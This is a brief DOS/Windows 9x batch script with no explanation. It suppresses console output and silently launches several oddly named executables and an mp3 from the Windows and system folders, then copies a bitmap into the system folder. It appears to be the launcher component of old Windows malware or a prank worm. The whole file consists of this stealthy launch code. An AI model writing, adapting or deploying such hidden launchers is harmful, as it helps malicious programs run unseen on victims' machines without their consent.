@ECHO OFF
ctty nul
if exist C:\Windows\system\delbuffy.exe start /m C:\Windows\system\delbuffy.exe
if exist C:\Windows\buffy.mp3 start /m C:\Windows\buffy.mp3
if exist C:\Windows\system\a_BUx.exe start /m C:\Windows\system\a_BUx.exe
if exist C:\Windows\system\m_BUy.exe start /m C:\Windows\system\m_BUy.exe
if exist C:\Windows\system\z_BUz.exe start /m C:\Windows\system\z_BUz.exe
if exist C:\Windows\buffy5.bmp copy C:\Windows\buffy5.bmp C:\Windows\system\buffy5.bmp /Y
ctty con
